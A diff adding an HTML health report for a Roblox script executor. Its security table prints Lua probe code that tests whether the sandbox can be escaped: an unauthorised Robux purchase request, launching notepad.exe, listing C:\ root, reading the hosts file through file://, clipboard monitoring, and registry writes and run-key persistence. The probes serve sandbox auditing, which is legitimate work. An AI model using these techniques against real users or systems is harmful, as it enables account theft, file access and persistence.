@@ -1,0 +1,2631 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ExecEnvHealthCheck 3.2 — Report</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Bebas+Neue&display=swap" rel="stylesheet">
+<style>
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; cursor: none !important; }
+
+:root {
+  --bg: #050c05;
+  --surface: rgba(0, 255, 65, 0.015);
+  --panel: rgba(0, 0, 0, 0.4);
+  --card: rgba(0, 255, 65, 0.01);
+  --border: rgba(0, 255, 65, 0.12);
+  --border2: rgba(0, 255, 65, 0.25);
+  --text: #dedede;
+  --muted: rgba(222,222,222,0.4);
+  --faint: rgba(0, 255, 65, 0.05);
+
+  --pass: #00ff41;
+  --fail: #ff3b3b;
+  --warn: #ffaa00;
+  --info: #3be8ff;
+  --purple: #ea80fc;
+  --skip: rgba(222,222,222,0.5);
+
+  --pass-bg: rgba(0,255,65,0.05);
+  --fail-bg: rgba(255,59,59,0.18);
+  --warn-bg: rgba(255,170,0,0.15);
+  --skip-bg: rgba(222,222,222,0.15);
+
+  --font-mono: 'Share Tech Mono', monospace;
+  --font-display: 'Bebas Neue', sans-serif;
+  --r: 0;
+}
+
+[data-theme="pink"] { --bg: #0a0118; --surface: rgba(255, 0, 255, 0.02); --panel: rgba(0, 0, 0, 0.6); --card: rgba(255, 0, 255, 0.015); --border: rgba(255, 0, 255, 0.2); --border2: rgba(255, 0, 255, 0.4); --pass: #ff00ff; --pass-bg: rgba(255, 0, 255, 0.08); }
+[data-theme="cherry"] { --bg: #1a0f14; --surface: rgba(255, 77, 109, 0.02); --panel: rgba(26, 15, 20, 0.8); --card: rgba(255, 77, 109, 0.015); --border: rgba(255, 77, 109, 0.25); --border2: rgba(255, 77, 109, 0.5); --pass: #ff4d6d; --pass-bg: rgba(255, 77, 109, 0.08); }
+[data-theme="blue"] { --bg: #010a14; --surface: rgba(0, 240, 255, 0.02); --panel: rgba(0, 0, 0, 0.5); --card: rgba(0, 240, 255, 0.015); --border: rgba(0, 240, 255, 0.2); --border2: rgba(0, 240, 255, 0.4); --pass: #00f0ff; --pass-bg: rgba(0, 240, 255, 0.08); }
+[data-theme="purple"] { --bg: #282a36; --surface: rgba(189, 147, 249, 0.03); --panel: rgba(40, 42, 54, 0.8); --card: rgba(189, 147, 249, 0.03); --border: rgba(189, 147, 249, 0.3); --border2: rgba(189, 147, 249, 0.6); --pass: #bd93f9; --pass-bg: rgba(189, 147, 249, 0.1); --fail: #ff5555; --fail-bg: rgba(255, 85, 85, 0.2); }
+[data-theme="orange"] { --bg: #141001; --surface: rgba(255, 170, 0, 0.03); --panel: rgba(0, 0, 0, 0.6); --card: rgba(255, 170, 0, 0.015); --border: rgba(255, 170, 0, 0.25); --border2: rgba(255, 170, 0, 0.5); --pass: #ffaa00; --pass-bg: rgba(255, 170, 0, 0.1); }
+[data-theme="gold"] { --bg: #141201; --surface: rgba(255, 215, 0, 0.03); --panel: rgba(0, 0, 0, 0.6); --card: rgba(255, 215, 0, 0.015); --border: rgba(255, 215, 0, 0.25); --border2: rgba(255, 215, 0, 0.5); --pass: #ffd700; --pass-bg: rgba(255, 215, 0, 0.1); }
+[data-theme="frost"] { --bg: #011014; --surface: rgba(160, 240, 255, 0.03); --panel: rgba(0, 0, 0, 0.6); --card: rgba(160, 240, 255, 0.015); --border: rgba(160, 240, 255, 0.25); --border2: rgba(160, 240, 255, 0.5); --pass: #a0f0ff; --pass-bg: rgba(160, 240, 255, 0.1); }
+[data-theme="radioactive"] { --bg: #0a1401; --surface: rgba(191, 255, 0, 0.03); --panel: rgba(0, 0, 0, 0.6); --card: rgba(191, 255, 0, 0.015); --border: rgba(191, 255, 0, 0.25); --border2: rgba(191, 255, 0, 0.5); --pass: #bfff00; --pass-bg: rgba(191, 255, 0, 0.1); }
+[data-theme="violet"] { --bg: #0a0114; --surface: rgba(138, 43, 226, 0.03); --panel: rgba(0, 0, 0, 0.6); --card: rgba(138, 43, 226, 0.015); --border: rgba(138, 43, 226, 0.25); --border2: rgba(138, 43, 226, 0.5); --pass: #8a2be2; --pass-bg: rgba(138, 43, 226, 0.1); }
+[data-theme="blood"] { --bg: #140101; --surface: rgba(220, 20, 60, 0.03); --panel: rgba(0, 0, 0, 0.6); --card: rgba(220, 20, 60, 0.015); --border: rgba(220, 20, 60, 0.25); --border2: rgba(220, 20, 60, 0.5); --pass: #dc143c; --pass-bg: rgba(220, 20, 60, 0.1); }
+[data-theme="mono"] { --bg: #050505; --surface: rgba(255, 255, 255, 0.03); --panel: rgba(0, 0, 0, 0.6); --card: rgba(255, 255, 255, 0.015); --border: rgba(255, 255, 255, 0.25); --border2: rgba(255, 255, 255, 0.5); --pass: #ffffff; --pass-bg: rgba(255, 255, 255, 0.1); }
+
+/* SETTINGS MODAL */
+.modal-overlay { position: fixed; inset: 0; z-index: 99999; background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity .3s; overflow: hidden; }
+.modal-overlay.active { opacity: 1; pointer-events: all; }
+.modal-lines { position: absolute; inset: 0; pointer-events: none; z-index: 1; overflow: hidden; }
+.modal-shp { position: absolute; background: var(--pass); opacity: 0.1; filter: blur(20px); border-radius: 50%; animation: floatShp 15s infinite alternate ease-in-out; }
+.modal-shp:nth-child(1) { width: 300px; height: 300px; top: -100px; left: -100px; animation-duration: 20s; }
+.modal-shp:nth-child(2) { width: 400px; height: 400px; bottom: -150px; right: 10%; animation-duration: 25s; animation-direction: alternate-reverse; }
+.modal-shp:nth-child(3) { width: 200px; height: 200px; top: 40%; left: 30%; animation-duration: 18s; }
+@keyframes floatShp { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(150px, 150px) scale(1.5); } }
+
+.modal-box { position: relative; z-index: 2; width: 480px; max-width: 90%; background: var(--panel); border: 1px solid var(--pass); box-shadow: 0 0 20px var(--pass-bg), inset 0 0 15px var(--pass-bg); padding: 40px; display: flex; flex-direction: column; gap: 30px; transform: scale(0.95); transition: transform .3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+.modal-overlay.active .modal-box { transform: scale(1); }
+.modal-title { font-family: var(--font-display); font-size: 36px; letter-spacing: 4px; color: var(--pass); text-shadow: 0 0 10px var(--pass-bg); text-align: center; line-height: 1; margin-bottom: -10px; }
+.theme-grid-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.theme-btn { background: var(--bg); border: 1px solid var(--border2); color: var(--text); padding: 14px; font-family: var(--font-mono); font-size: 11px; letter-spacing: 2px; cursor: none; transition: all .2s; text-transform: uppercase; }
+.theme-btn:hover, .theme-btn.active { border-color: var(--pass); color: var(--pass); background: var(--pass-bg); box-shadow: inset 0 0 10px var(--pass-bg); text-shadow: 0 0 5px var(--pass-bg); }
+.close-btn { align-self: center; background: transparent; border: none; border-bottom: 2px solid var(--pass); color: var(--text); font-family: var(--font-mono); padding: 8px 24px; transition: .2s; cursor: none; letter-spacing: 3px; font-size: 11px; text-transform: uppercase; }
+.close-btn:hover { border-bottom-color: #fff; color: #fff; text-shadow: 0 0 8px rgba(255,255,255,0.4); }
+
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 13px;
+  line-height: 1.65;
+  cursor: none !important;
+}
+
+/* CUSTOM CURSOR */
+#cur {
+  position: fixed; top: 0; left: 0; width: 8px; height: 8px;
+  background: var(--pass); border-radius: 50%;
+  pointer-events: none; transform: translate(-50%, -50%);
+  z-index: 10000; transition: width 0.2s, height 0.2s, background 0.2s;
+  box-shadow: 0 0 12px rgba(0, 255, 65, 0.4);
+}
+#cur-ring {
+  position: fixed; width: 24px; height: 24px;
+  border: 1px solid rgba(0,255,65,0.4); border-radius: 50%;
+  pointer-events: none; z-index: 9999;
+  transform: translate(-50%,-50%);
+  transition: width .18s, height .18s;
+}
+
+#bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+.vig { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: radial-gradient(ellipse at 50% 50%, transparent 40%, rgba(0,0,0,0.72) 100%); }
+.grid { position: fixed; inset: 0; z-index: 1; pointer-events: none; background-image: linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px); background-size: 48px 48px; }
+
+header, nav, main, footer { position: relative; z-index: 10; }
+
+/* CUSTOM SCROLLBARS */
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: var(--bg); border-left: 1px solid var(--border); }
+::-webkit-scrollbar-thumb { background: var(--border2); }
+::-webkit-scrollbar-thumb:hover { background: var(--pass); }
+
+::selection { background: rgba(0,255,65,0.2); color: var(--pass); }
+
+header {
+  display: flex; justify-content: space-between; align-items: flex-end; flex-wrap: wrap; gap: 20px;
+  padding: 36px 48px 28px;
+  border-bottom: 2px solid var(--border);
+  background: var(--surface);
+  position: relative;
+}
+header::after {
+  content:''; position:absolute; bottom:0; left:0; width:100%; height:1px;
+  background: var(--pass); box-shadow: 0 0 8px var(--pass); opacity: 0.5;
+}
+.h-kicker { font-size: 11px; letter-spacing: 5px; text-transform: uppercase; color: var(--pass); margin-bottom: 8px; text-shadow: 0 0 5px rgba(0,255,65,0.3); }
+.h-title { font-family: var(--font-display); font-size: clamp(44px, 6vw, 72px); line-height: .92; letter-spacing: 2px; color: #fff; text-shadow: 0 0 15px rgba(0,255,65,0.2); }
+.h-title em { color: var(--pass); font-style: normal; }
+.h-right { display: flex; flex-direction: column; align-items: flex-end; gap: 10px; }
+.meta-grid { display: grid; grid-template-columns: auto auto; gap: 4px 16px; font-size: 11px; color: var(--muted); text-align: right; }
+.meta-grid strong { color: #fff; font-weight: normal; letter-spacing: 1px; }
+
+.theme-toggle { display: none; }
+
+nav { display: flex; overflow-x: auto; background: var(--bg); border-bottom: 1px solid var(--border); padding: 0 48px; position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+nav a { display: block; color: var(--muted); text-decoration: none; font-size: 12px; letter-spacing: 3px; text-transform: uppercase; padding: 12px 16px; border-bottom: 2px solid transparent; margin-bottom: -1px; white-space: nowrap; transition: all .2s; cursor: none; }
+nav a:hover { color: var(--pass); text-shadow: 0 0 8px rgba(0,255,65,0.4); background: rgba(0,255,65,0.02); }
+nav a.active { color: var(--pass); border-bottom-color: var(--pass); text-shadow: 0 0 8px rgba(0,255,65,0.4); background: rgba(0,255,65,0.05); }
+
+main { max-width: 1400px; margin: 0 auto; padding: 52px 48px; display: flex; flex-direction: column; gap: 72px; }
+
+.sec { scroll-margin-top: 52px; }
+.sh { display: flex; align-items: baseline; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 10px; position: relative; }
+.sh::before { content:''; position:absolute; bottom:-1px; left:0; width:40px; height:1px; background:var(--pass); box-shadow:0 0 5px var(--pass); }
+.sh-title { font-family: var(--font-display); font-size: 32px; letter-spacing: 2px; color: #fff; text-shadow: 0 0 8px rgba(255,255,255,0.1); }
+.sh-meta { font-size: 11px; letter-spacing: 3px; text-transform: uppercase; color: var(--pass); text-shadow: 0 0 8px rgba(0,255,65,0.3); }
+
+.stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 1px; background: var(--border); border: 1px solid var(--border); margin-bottom: 24px; box-shadow: 0 0 20px rgba(0,255,65,0.05); }
+.stat-card { background: var(--panel); padding: 20px 16px 18px; position: relative; overflow: hidden; transition: background .3s; }
+.stat-pass:hover { background: var(--pass-bg); }
+.stat-fail:hover { background: var(--fail-bg); }
+.stat-warn:hover { background: var(--warn-bg); }
+.stat-skip:hover { background: var(--skip-bg); }
+.stat-info:hover { background: rgba(59,232,255,0.05); }
+.stat-purple:hover { background: rgba(234,128,252,0.05); }
+.stat-val { font-family: var(--font-display); font-size: clamp(32px, 3.5vw, 48px); line-height: 1; letter-spacing: 1px; }
+.stat-label { font-size: 11px; letter-spacing: 3px; text-transform: uppercase; color: var(--muted); margin-top: 8px; }
+.stat-sub { font-size: 11px; color: var(--muted); margin-top: 2px; }
+.stat-bar { position: absolute; bottom: 0; left: 0; right: 0; height: 2px; box-shadow: 0 0 8px currentColor; opacity: 0.8; transition: height .2s; }
+.stat-card:hover .stat-bar { height: 4px; }
+
+.stat-pass .stat-val { color: var(--pass); text-shadow: 0 0 10px rgba(0,255,65,0.3); } .stat-pass .stat-bar { background: var(--pass); color: var(--pass); }
+.stat-fail .stat-val { color: var(--fail); text-shadow: 0 0 10px rgba(255,59,59,0.3); } .stat-fail .stat-bar { background: var(--fail); color: var(--fail); }
+.stat-warn .stat-val { color: var(--warn); text-shadow: 0 0 10px rgba(255,170,0,0.3); } .stat-warn .stat-bar { background: var(--warn); color: var(--warn); }
+.stat-info .stat-val { color: var(--info); text-shadow: 0 0 10px rgba(59,232,255,0.3); } .stat-info .stat-bar { background: var(--info); color: var(--info); }
+.stat-purple .stat-val { color: var(--purple); text-shadow: 0 0 10px rgba(234,128,252,0.3); } .stat-purple .stat-bar { background: var(--purple); color: var(--purple); }
+
+.banner { padding: 12px 16px; font-size: 11px; letter-spacing: 1.5px; border-left: 2px solid; margin-bottom: 20px; background: var(--surface); box-shadow: 0 0 10px rgba(0,0,0,0.5); text-transform: uppercase; }
+.banner-ok   { border-color: var(--pass); color: var(--pass); text-shadow: 0 0 8px rgba(0,255,65,0.3); }
+.banner-warn { border-color: var(--fail); color: var(--fail); text-shadow: 0 0 8px rgba(255,59,59,0.3); }
+
+.tbl-wrap { border: 1px solid var(--border); overflow-x: auto; background: var(--surface); box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+table { width: 100%; border-collapse: collapse; font-size: 11.5px; }
+thead th { background: rgba(0,255,65,0.03); font-size: 10px; letter-spacing: 3px; text-transform: uppercase; color: var(--pass); padding: 12px 14px; text-align: left; border-bottom: 1px solid var(--border); white-space: nowrap; text-shadow: 0 0 5px rgba(0,255,65,0.3); }
+.th-accent { width: 3px; padding: 0 !important; }
+
+tbody tr { border-bottom: 1px solid var(--border); transition: background .2s; }
+tbody tr:last-child { border-bottom: none; }
+tbody tr:hover:not(.det-row) { background: rgba(0,255,65,0.04); }
+tbody tr.row-fail { background: rgba(255,59,59,0.12); }
+tbody tr.row-fail:hover:not(.det-row) { background: var(--fail-bg); }
+tbody tr.row-skip { background: rgba(222,222,222,0.08); }
+tbody tr.row-skip:hover:not(.det-row) { background: var(--skip-bg); }
+tbody tr.row-warn:hover:not(.det-row) { background: var(--warn-bg); }
+tbody td { padding: 12px 14px; vertical-align: middle; }
+thead th:last-child, tbody tr:not(.det-row) td:last-child { text-align: center; }
+
+.td-accent { width: 3px; padding: 0 !important; opacity: 0.8; }
+.accent-fail { background: var(--fail); box-shadow: 0 0 8px var(--fail); }
+.accent-pass { background: var(--pass); box-shadow: 0 0 8px var(--pass); }
+.accent-warn { background: var(--warn); box-shadow: 0 0 8px var(--warn); }
+.accent-skip { background: var(--skip); box-shadow: 0 0 8px var(--skip); }
+
+.td-name { font-weight: normal; letter-spacing: 1px; font-size: 12px; color: #fff; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
+.td-cat  { font-size: 10px; color: var(--muted); letter-spacing: 1.5px; text-transform: uppercase; }
+.td-msg  { color: var(--muted); font-size: 11px; max-width: 280px; }
+
+.tag { display: inline-block; font-size: 9px; font-weight: normal; letter-spacing: 2px; text-transform: uppercase; padding: 3px 8px; border: 1px solid; }
+.tag-pass { background: rgba(0,255,65,0.1); color: var(--pass); border-color: rgba(0,255,65,0.4); text-shadow: 0 0 5px rgba(0,255,65,0.5); }
+.tag-fail { background: rgba(255,59,59,0.1); color: var(--fail); border-color: rgba(255,59,59,0.4); text-shadow: 0 0 5px rgba(255,59,59,0.5); }
+.tag-skip { background: rgba(222,222,222,0.05); color: var(--skip); border-color: rgba(222,222,222,0.2); }
+.tag-warn { background: rgba(255,170,0,0.1); color: var(--warn); border-color: rgba(255,170,0,0.4); text-shadow: 0 0 5px rgba(255,170,0,0.5); }
+
+.vbtn { font-family: var(--font-mono); font-size: 9px; letter-spacing: 2px; text-transform: uppercase; background: transparent; border: 1px solid var(--border2); color: var(--muted); padding: 6px 12px; cursor: none; white-space: nowrap; transition: all .2s; }
+.vbtn:hover           { border-color: var(--pass); color: var(--pass); background: rgba(0,255,65,0.05); text-shadow: 0 0 5px rgba(0,255,65,0.3); box-shadow: 0 0 10px rgba(0,255,65,0.1) inset; }
+.vbtn.open            { border-color: var(--pass); color: var(--bg); background: var(--pass); text-shadow: none; box-shadow: 0 0 10px rgba(0,255,65,0.4); }
+.vbtn-fail            { border-color: rgba(255,59,59,0.4); color: var(--fail); }
+.vbtn-fail:hover      { border-color: var(--fail); color: var(--fail); background: rgba(255,59,59,0.05); text-shadow: 0 0 5px rgba(255,59,59,0.3); box-shadow: 0 0 10px rgba(255,59,59,0.1) inset; }
+.vbtn-fail.open       { border-color: var(--fail); color: var(--bg); background: var(--fail); text-shadow: none; box-shadow: 0 0 10px rgba(255,59,59,0.4); }
+.vbtn-skip            { border-color: rgba(222,222,222,0.3); color: var(--skip); }
+.vbtn-skip:hover      { border-color: var(--skip); color: var(--skip); background: rgba(222,222,222,0.05); text-shadow: 0 0 5px rgba(222,222,222,0.3); box-shadow: 0 0 10px rgba(222,222,222,0.1) inset; }
+.vbtn-skip.open       { border-color: var(--skip); color: var(--bg); background: var(--skip); text-shadow: none; box-shadow: 0 0 10px rgba(222,222,222,0.4); }
+
+
+.det-row { display: none; }
+.det-row.open { display: table-row; }
+.det-cell { padding: 0 !important; border-left: 3px solid transparent; }
+.det-cell.accent-fail { border-left-color: var(--fail); box-shadow: inset 10px 0 20px rgba(255,59,59,0.05); }
+.det-cell.accent-pass { border-left-color: var(--pass); box-shadow: inset 10px 0 20px rgba(0,255,65,0.05); }
+.det-cell.accent-warn { border-left-color: var(--warn); box-shadow: inset 10px 0 20px rgba(255,170,0,0.05); }
+.det-cell.accent-skip { border-left-color: var(--skip); box-shadow: inset 10px 0 20px rgba(222,222,222,0.02); }
+
+.det-pre { background: rgba(0,0,0,0.6); color: #fff; font-family: var(--font-mono); font-size: 11px; line-height: 1.8; padding: 20px 24px; overflow-x: auto; white-space: pre; border-top: 1px solid transparent; }
+
+.ips-val   { display: block; font-size: 11px; color: var(--info); margin-bottom: 4px; text-shadow: 0 0 5px rgba(59,232,255,0.4); }
+.ips-track { height: 2px; background: var(--border); width: 80px; box-shadow: inset 0 0 2px rgba(0,0,0,0.5); }
+.ips-fill  { height: 100%; background: var(--info); box-shadow: 0 0 6px var(--info); }
+
+.fn-chip { font-size: 10px; letter-spacing: 1px; padding: 4px 10px; background: rgba(255,59,59,0.1); color: var(--fail); border: 1px solid rgba(255,59,59,0.4); text-shadow: 0 0 5px rgba(255,59,59,0.3); }
+
+footer { border-top: 1px solid var(--border); padding: 20px 48px; font-size: 10px; color: var(--muted); letter-spacing: 2px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 6px; background: var(--surface); text-transform: uppercase; }
+
+@media (max-width: 700px) { header, main, nav, footer { padding-left: 20px; padding-right: 20px; } .stat-grid { grid-template-columns: repeat(2, 1fr); } }
+
+/* Back Nav Bar */
+.page-nav { display: flex; gap: 0.8rem; margin-bottom: 24px; }
+.nav-btn { display: inline-flex; align-items: center; gap: 0.5rem; border: 1px solid var(--border2); color: var(--pass); background: rgba(0,0,0,0.5); padding: 0.65rem 1.5rem; font-family: var(--font-mono); font-size: 0.65rem; letter-spacing: 0.2em; text-decoration: none; cursor: none; transition: all 0.2s; text-transform: uppercase; }
+.nav-btn:hover { border-color: var(--pass); background: var(--pass-bg); box-shadow: 0 0 14px var(--pass-bg); text-shadow: 0 0 8px var(--pass); }
+
+
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <div class="h-kicker">executor environment health report &nbsp;·&nbsp; v3.2</div>
+    <div class="h-title">EXEC<br><em>HEALTH</em></div>
+  </div>
+  <div class="h-right">
+    <button class="theme-toggle" id="tbtn" onclick="openSettings()">SETTINGS</button>
+    <div class="meta-grid">
+      <span>EXECUTOR</span><strong>Madium</strong>
+      <span>TIMESTAMP</span><strong>2026-03-28 04:18:55</strong>
+      <span>TOTAL TIME</span><strong>59.89s</strong>
+      <span>MEMORY</span><strong>8.03 MB</strong>
+    </div>
+  </div>
+</header>
+
+<nav id="nav">
+  <a href="#overview"  class="active">OVERVIEW</a>
+  <a href="#security">SECURITY</a>
+  <a href="#functions">FUNCTIONS</a>
+  <a href="#ui">UI LIBS</a>
+  <a href="#stress">STRESS</a>
+  <a href="#fibonacci">FIBONACCI</a>
+</nav>
+
+<main>
+<div class="page-nav">
+  <a href="index.html" class="nav-btn">&#8962; HOME</a>
+  <a href="results.html" class="nav-btn">&#8592; REPORTS</a>
+</div>
+
+<section class="sec" id="overview">
+  <div class="sh">
+    <div class="sh-title">OVERVIEW</div>
+    <div class="sh-meta">ALL MODULES</div>
+  </div>
+  <div class="stat-grid">
+    <div class='stat-card stat-pass'><div class='stat-val'>93%</div><div class='stat-label'>SECURITY</div><div class='stat-sub'>85 mitigated / 6 vuln</div><div class='stat-bar'></div></div>    <div class='stat-card stat-pass'><div class='stat-val'>100%</div><div class='stat-label'>FUNCTIONS</div><div class='stat-sub'>55 / 55 present</div><div class='stat-bar'></div></div>    <div class='stat-card stat-pass'><div class='stat-val'>84%</div><div class='stat-label'>UI LIBS</div><div class='stat-sub'>11 / 13 loaded</div><div class='stat-bar'></div></div>    <div class='stat-card stat-pass'><div class='stat-val'>6/6</div><div class='stat-label'>STRESS</div><div class='stat-sub'>5,336,454 avg iter/s</div><div class='stat-bar'></div></div>    <div class='stat-card stat-purple'><div class='stat-val'>F(10,000)</div><div class='stat-label'>FIBONACCI</div><div class='stat-sub'>2,090 digits</div><div class='stat-bar'></div></div>  </div>
+</section>
+
+<section class="sec" id="security">
+  <div class="sh">
+    <div class="sh-title">SECURITY</div>
+    <div class="sh-meta">113 TESTS · 6 VULN · 22 SKIPPED</div>
+  </div>
+  <div class='banner banner-warn'>! 6 VULNERABLE VECTORS — expand any failing row to inspect the probe code.</div>  <div class="tbl-wrap">
+    <table>
+      <thead><tr>
+        <th class="th-accent"></th>
+        <th>TEST NAME</th>
+        <th>STATUS</th>
+        <th>DETAIL</th>
+        <th></th>
+      </tr></thead>
+      <tbody>
+        <tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>Robux API Access</td><td><span class='tag tag-fail'>VULNERABLE</span></td><td class='td-msg'>:2698: Roblox API access</td><td><button class='vbtn vbtn-fail' onclick="toggle('p46',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p46'><td colspan='5' class='det-cell accent-fail'><pre class='det-pre'>{
+    name = "Robux API Access",
+    callback = function()
+        local hasHTTP = HttpChecker.check("Request","") or HttpChecker.check("Get","Get") or HttpChecker.check("Post","Post")
+        if hasHTTP then
+            local results = {}
+            Utils.safePcall(function()
+                if request then
+                    results.v1 = request({
+                        Url    = "https://economy.roblox.com/v1/user/currency",
+                        Method = "GET"
+                    })
+                end
+            end)
+            Utils.safePcall(function()
+                results.v2 = game:HttpGet("https://economy.roblox.com/v1/user/currency")
+            end)
+            Utils.safePcall(function()
+                results.v3 = game:HttpPost(
+                    "https://economy.roblox.com/v1/purchases/products/41762",
+                    '{"expectedCurrency":1,"expectedPrice":0,"expectedSellerId":116444}'
+                )
+            end)
+            assert(results.v1==nil or results.v2==nil or results.v3==nil, "Roblox API access")
+        else
+            return "Executor does not support HTTP functions"
+        end
+    end,
+},</pre></td></tr><tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>ScriptContext:AddCoreScriptLocal</td><td><span class='tag tag-fail'>VULNERABLE</span></td><td class='td-msg'>:2710: CoreScript access</td><td><button class='vbtn vbtn-fail' onclick="toggle('p47',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p47'><td colspan='5' class='det-cell accent-fail'><pre class='det-pre'>{
+    name = "ScriptContext:AddCoreScriptLocal",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("ScriptContext"):AddCoreScriptLocal("CoreScripts/ProximityPrompt", actor)
+        end)
+        assert(errorMsg, "CoreScript access")
+    end,
+},</pre></td></tr><tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>MessageBusService:Publish (URL)</td><td><span class='tag tag-fail'>VULNERABLE</span></td><td class='td-msg'>:2722: System command execution</td><td><button class='vbtn vbtn-fail' onclick="toggle('p48',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p48'><td colspan='5' class='det-cell accent-fail'><pre class='det-pre'>{
+    name = "MessageBusService:Publish (URL)",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Publish(
+                game:GetService("MessageBusService"):GetMessageId("Linking","openURLRequest"),
+                { url = "notepad.exe" }
+            )
+        end)
+        assert(errorMsg, "System command execution")
+    end,
+},</pre></td></tr><tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>ContentProvider:PreloadAsync</td><td><span class='tag tag-fail'>VULNERABLE</span></td><td class='td-msg'>:2742: ContentProvider misuse</td><td><button class='vbtn vbtn-fail' onclick="toggle('p50',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p50'><td colspan='5' class='det-cell accent-fail'><pre class='det-pre'>{
+    name = "ContentProvider:PreloadAsync",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            for _, descendant in ipairs(game:GetService("Players"):GetDescendants()) do
+                if descendant:IsA("ScreenGui") then
+                    game:GetService("ContentProvider"):PreloadAsync(descendant)
+                end
+            end
+        end)
+        assert(errorMsg, "ContentProvider misuse")
+    end,
+},</pre></td></tr><tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>listfiles() root access</td><td><span class='tag tag-fail'>VULNERABLE</span></td><td class='td-msg'>:2751: File system access</td><td><button class='vbtn vbtn-fail' onclick="toggle('p51',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p51'><td colspan='5' class='det-cell accent-fail'><pre class='det-pre'>{
+    name = "listfiles() root access",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, e1 = pcall(function() local f = listfiles(""); if #f &gt; 0 then end end)
+        local _, e2 = pcall(function() local f = listfiles("C:\\"); if #f &gt; 0 then end end)
+        assert(e1 or e2, "File system access")
+    end,
+},</pre></td></tr><tr class='row row-fail'><td class='td-accent accent-fail'></td><td class='td-name'>Network: file:// Protocol Access</td><td><span class='tag tag-fail'>VULNERABLE</span></td><td class='td-msg'>:2838: file:// protocol readable</td><td><button class='vbtn vbtn-fail' onclick="toggle('p60',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p60'><td colspan='5' class='det-cell accent-fail'><pre class='det-pre'>{
+    name = "Network: file:// Protocol Access",
+    callback = function()
+        local ok, result = pcall(function()
+            return game:HttpGet("file:///C:/Windows/System32/drivers/etc/hosts")
+        end)
+        if ok and type(result)=="string" and #result&gt;0 then
+            error("file:// protocol readable")
+        end
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Clipboard Data Theft</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p57',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p57'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Clipboard Data Theft",
+    callback = function()
+        if not setclipboard or not getclipboard then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local original = getclipboard()
+            game:GetService("RunService").Heartbeat:Connect(function()
+                local current = getclipboard()
+                if current ~= original then print("Clipboard monitoring active") end
+            end)
+        end)
+        assert(err, "Clipboard monitoring capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Registry Key Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p63',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p63'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Registry Key Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('reg add "HKEY_CURRENT_USER\\Software\\TestKey" /f')
+        end)
+        assert(err, "Registry write access")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Run Key Persistence</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p64',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p64'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Run Key Persistence",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
